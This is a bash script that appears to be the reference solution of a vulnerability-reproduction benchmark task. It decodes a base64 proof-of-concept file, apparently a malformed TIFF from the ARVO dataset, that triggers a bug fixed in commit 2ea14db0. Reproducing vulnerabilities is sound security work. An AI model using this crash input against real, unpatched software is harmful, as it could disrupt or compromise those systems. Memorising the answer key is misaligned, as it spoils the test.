#!/bin/bash
# Reference solution: materialize the known-good PoC (the ARVO testcase the
# fix commit 2ea14db0 addresses) at /workspace/poc — the 'oracle passes' side of
# the bidirectional validation. (Does NOT build; grading runs on the oracle's
# untouched images, so this is level-independent.)
set -euo pipefail

mkdir -p /workspace
base64 -d > /workspace/poc <<'B64'
SUkqAAgAAAAjACAgAgAgICAgICAgICAgAAAgICAgICAgICAgAQAgICAgICAgICAgAQAgICAgICAgIAIBAwASAAAAvgEAACAgAwAgICAgICAg//8gAwAgICAgICAgICAgAgAgICAgICAgIBABAgAgAAAAIAEAACAgAwAgICAgICAgICAgAwAgICAgICAgICAgAwAgICAgICAgICAgAwAgICAgICAgICAgAwAgICAgICAgICAgAAAgICAgICAgICAgAwAgICAgICAgICAgAwAgICAgICAgIAMBAwABAAAABYAgICAgAwAgICAgICAgIAEBAwACAAAAAQMgICAgAAAgICAgICD//w8BAgAgAAAAIAEAABEBAwABAAAAMwEgIAABAwACAAAAAAEgICAgAwAgICAg////ICABAwABIDQgICD/ICAgAwCWICAgICAgIBcBBAABAAAAxAAAACAgCgAg/yAAICAgICogAgAgICAgICAgICAgCgBkICAAICAgICAgAAAgIFIWICAgICAgAgAgRSAg/yAgIAwgBAD//SAgICAgIEwgAQAgAP//ICAgIAAAAAAgAP8gICAgICAgICAOAEYgICAgICAgICAgICAgICAg//////////8gICAgICAgICAgICAgICAgICAgICAgICAgICAgICA=
B64

echo "wrote $(wc -c < /workspace/poc) bytes to /workspace/poc"
